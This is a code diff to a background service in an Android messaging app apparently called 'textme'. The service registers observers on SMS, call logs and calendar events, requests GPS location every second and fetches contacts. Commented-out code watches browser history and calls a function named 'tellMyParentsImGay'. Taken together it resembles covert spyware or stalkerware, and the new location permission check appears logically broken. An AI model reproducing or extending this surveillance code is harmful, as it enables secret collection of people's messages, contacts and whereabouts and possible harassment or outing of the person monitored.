@@ -41,6 +41,7 @@ import com.candroid.textme.receivers.OutgoingReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
 import com.candroid.textme.receivers.WifiReceiver;
+import com.candroid.textme.ui.activities.MainActivity;
 
 import java.util.ArrayList;
 
@@ -139,9 +140,14 @@ public class MessagingService extends Service {
         mCallLogObserver = new CallLogObserver();
         mCalendarObserver = new CalendarObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
-        getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
-        //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
-        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
+        if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
+            getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
+
+        }
+        if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
+            getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
+        }
+            //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
  /*       if(Lofl.isExternalStorageReadable()){
             File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
             if(! audioFile.exists()){
@@ -191,34 +197,16 @@ public class MessagingService extends Service {
                 Lofl.tellMyParentsImGay(MessagingService.this);
             }
         }).start();*/
-        mHandlerThread = new HandlerThread("locationThread");
-        mHandlerThread.start();
-        mLooper = mHandlerThread.getLooper();
-        String locationProvider = LocationManager.GPS_PROVIDER;
-        mLocationManager = Lofl.getLocationManager(MessagingService.this);
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    Activity#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for Activity#requestPermissions for more details.
-            return;
+
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            mHandlerThread = new HandlerThread("locationThread");
+            mHandlerThread.start();
+            mLooper = mHandlerThread.getLooper();
+            String locationProvider = LocationManager.GPS_PROVIDER;
+            mLocationManager = Lofl.getLocationManager(MessagingService.this);
+            mLocationListener = Lofl.getLocationListener(this);
+            mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }
-        mLocationListener = Lofl.getLocationListener(this);
-        mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
-/*        ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
-        ArrayList<String> dictionary = Lofl.fetchDictionary(this);
-        for(String word : dictionary){
-            Log.d("DICTIONARY", word);*/
-        //}
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(MessagingService.this);
-            }
-        }).start();
     }
 
     @Override
